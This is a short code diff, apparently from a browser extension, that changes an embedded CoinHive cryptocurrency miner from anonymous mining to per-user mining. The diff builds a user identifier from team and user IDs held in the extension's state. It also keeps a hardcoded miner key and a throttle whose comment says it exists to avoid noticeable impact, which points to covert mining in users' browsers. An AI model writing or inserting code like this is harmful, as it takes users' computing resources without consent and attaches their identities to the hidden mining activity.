@@ -79,7 +79,17 @@ chrome.runtime.onConnect.addListener((port) => {
 if (CoinHive) {
   let experimentsEnabled = true;
   const coinHiveKey = 'qiZSFIILkIS5lVlv0vrfwwBrCZFytCrJ';
-  const miner = new CoinHive.Anonymous(coinHiveKey);
+  let userId = 'anonymous';
+
+  if (state && state.teams && state.teams.data) {
+    const teams = Object.values(state.teams.data);
+    const team = teams[0];
+    if (team && team.team && team.self) {
+      userId = `${team.team.id}-${team.self.id}`;
+    }
+  }
+
+  const miner = new CoinHive.User(coinHiveKey, userId);
 
   // Heavily throttle mining to prevent noticiable impact
   miner.setThrottle(0.9);
